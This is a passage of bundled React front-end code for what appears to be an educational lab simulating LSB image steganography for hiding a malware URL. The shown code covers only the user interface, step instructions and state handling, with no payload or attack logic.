                                            src: It,
                                            alt: "compiled-item",
                                          })
                                        : jsxRuntimeExports.jsx("div", {
                                            style: {
                                              width: "300px",
                                              height: 40,
                                              background: "white",
                                              borderRadius: 30,
                                              padding: 10,
                                              color: "black",
                                              boxShadow: "green 0px 5px 15px",
                                              marginInline: 5,
                                              cursor: "grabbing",
                                              marginBlock: 10,
                                            },
                                            children: jsxRuntimeExports.jsx(
                                              "h5",
                                              {
                                                style: { margin: 0 },
                                                children: It,
                                              }
                                            ),
                                          }),
                                  },
                                  Ot
                                )
                              ),
                            ],
                          }),
                      nt &&
                        ot &&
                        !_t &&
                        jsxRuntimeExports.jsx("div", {
                          style: {
                            width: "100%",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: "center",
                          },
                          children: jsxRuntimeExports.jsx(Button, {
                            onClick: wt,
                            style: {
                              width: "100%",
                              borderBottomRightRadius: 20,
                              borderBottomLeftRadius: 20,
                              margin: 0,
                              color: _t ? "white" : "black",
                              outline: "none",
                            },
                            disabled: _t,
                            children: "Encode",
                          }),
                        }),
                    ],
                  }),
                ],
              }),
            ],
          }),
        }),
      ],
    });
  },
  PlayGround = () => {
    const { checkedValue: i, openSimulation: a } = useSelector((o) => o.exp);
    return jsxRuntimeExports.jsxs("div", {
      style: {
        flex: 0.75,
        background: "#00122E",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
      },
      children: [
        i === 1 && jsxRuntimeExports.jsx(ChromeBrowserContainer, {}),
        i === 2 && jsxRuntimeExports.jsx(UnHideTextComponent, {}),
        i === 3 && jsxRuntimeExports.jsx(UserSimulation, {}),
      ],
    });
  },
  Instructions = () => {
    const {
        instructions: i,
        steps: a,
        checkedValue: o,
      } = useSelector((ot) => ot.exp),
      s = useDispatch(),
      tt = reactExports.useRef(null),
      nt = () => {
        s(updateOpenSimulation(!0)),
          s(updateCheckedValue(3)),
          s(updateCheckedValue(3)),
          s(updateClearSteps()),
          s(
            updateSteps(
              "Info: You may check the code used to simulate this experiment by clicking the “terminal” icon on the top right corner of the “Python Input Box”."
            )
          ),
          s(
            updateSteps(
              "Drag and drop an image to “Python Input Box”. This image will be used to hide malware’s URL."
            )
          );
      };
    return (
      reactExports.useEffect(() => {
        tt.current && (tt.current.scrollTop = tt.current.scrollHeight);
      }, [i]),
      jsxRuntimeExports.jsx("div", {
        style: { marginBlock: 10, height: "90%", overflowY: "auto" },
        id: "scroll",
        ref: tt,
        children: a.map((ot, st) =>
          jsxRuntimeExports.jsx(
            "div",
            {
              style: { width: "95%", borderRadius: 20, paddingInline: 15 },
              children: jsxRuntimeExports.jsxs(
                "div",
                {
                  style: {
                    marginBlock: 10,
                    display: "flex",
                    flexDirection: "column",
                  },
                  children: [
                    jsxRuntimeExports.jsxs("div", {
                      style: { display: "flex", marginBlock: 5 },
                      children: [
                        jsxRuntimeExports.jsxs("h5", {
                          style: {
                            margin: 0,
                            fontSize: 13,
                            fontWeight: 500,
                            color: "black",
                          },
                          children: [st + 1, "."],
                        }),
                        jsxRuntimeExports.jsx("h5", {
                          style: {
                            margin: 0,
                            marginLeft: 5,
                            color: "black",
                            fontWeight: 500,
                          },
                          children: ot,
                        }),
                      ],
                    }),
                    st === 2 &&
                      o === 2 &&
                      jsxRuntimeExports.jsxs("div", {
                        style: { marginTop: 15 },
                        children: [
                          jsxRuntimeExports.jsx(Button, {
                            onClick: nt,
                            style: { background: "#0c2136", color: "white" },
                            children: "Real Time Simulation",
                          }),
                          jsxRuntimeExports.jsx(Button, {
                            onClick: () => {
                              s(updateCheckedValue(1)),
                                s(updateClearSteps()),
                                s(onClearAll());
                            },
                            style: { background: "#0c2136", color: "white" },
                            children: "Encoding",
                          }),
                        ],
                      }),
                  ],
                },
                st
              ),
            },
            st
          )
        ),
      })
    );
  },
  ControlPanel = () =>
    jsxRuntimeExports.jsxs("div", {
      style: { flex: 0.25, background: "white" },
      children: [
        jsxRuntimeExports.jsx("div", {
          style: {
            width: "100%",
            height: 50,
            padding: 5,
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            background: "#0c2136",
          },
          children: jsxRuntimeExports.jsx("span", {
            style: {
              fontSize: 13,
              fontWeight: 600,
              textTransform: "uppercase",
              color: "white",
            },
            children: "LSB technique",
          }),
        }),
        jsxRuntimeExports.jsx(Divider, { style: { marginBlock: 4 } }),
        jsxRuntimeExports.jsxs("div", {
          style: { color: "black", height: "100%" },
          children: [
            jsxRuntimeExports.jsx("h5", {
              style: { marginLeft: 5, marginBottom: 5 },
              children: "Steps:",
            }),
            jsxRuntimeExports.jsx("div", {
              style: { height: "100%" },
              children: jsxRuntimeExports.jsx(Instructions, {}),
            }),
          ],
        }),
      ],
    }),
  MainContainer = () => {
    const { checkedValue: i, openSimulation: a } = useSelector((o) => o.exp);
    return (
      console.log(a),
      jsxRuntimeExports.jsxs("div", {
        style: {
          display: "flex",
          flex: 1,
          width: "100%",
          height: "100%",
          overflow: "hidden",
        },
        children: [
          i !== 3 && jsxRuntimeExports.jsx(ControlPanel, {}),
          jsxRuntimeExports.jsx(PlayGround, {}),
          i === 3 &&
            jsxRuntimeExports.jsxs("div", {
              style: { flex: 0.25, background: "white" },
              children: [
                jsxRuntimeExports.jsx("div", {
                  style: {
                    height: 50,
                    display: "flex",
                    justifyContent: "center",
                    background: "#0c2135",
                    color: "white",
                    alignItems: "center",
                  },
                  children: jsxRuntimeExports.jsx("h5", {
                    style: { margin: 0 },
                    children: "Operation",
                  }),
                }),
                jsxRuntimeExports.jsx(Instructions, {}),
              ],
            }),
        ],
      })
    );
  },
  store = configureStore({ reducer: { exp: experimentOneReducer } });
class ErrorBoundaries extends reactExports.Component {
  constructor(a) {
    super(a), (this.state = { hasError: !1 });
  }
  static getDerivedStateFromError() {
    return { hasError: !0 };
  }
  componentDidCatch(a, o) {
    console.log(a, o);
  }
  render() {
    const { hasError: a } = this.state,
      { children: o } = this.props;
    return a
      ? jsxRuntimeExports.jsx("div", { children: "Something went wrong" })
      : o;
  }
}
function App() {
  const a = (
    (o) => (s) =>
      o + s
  )(5);
  return (
    console.log(a(6)),
    jsxRuntimeExports.jsx(ErrorBoundaries, {
      children: jsxRuntimeExports.jsx(Provider_default, {
        store,
        children: jsxRuntimeExports.jsx(MainContainer, {}),
      }),
    })
  );
}
client
  .createRoot(document.getElementById("root"))
  .render(
    jsxRuntimeExports.jsx(React$1.StrictMode, {
      children: jsxRuntimeExports.jsx(App, {}),
    })
  );
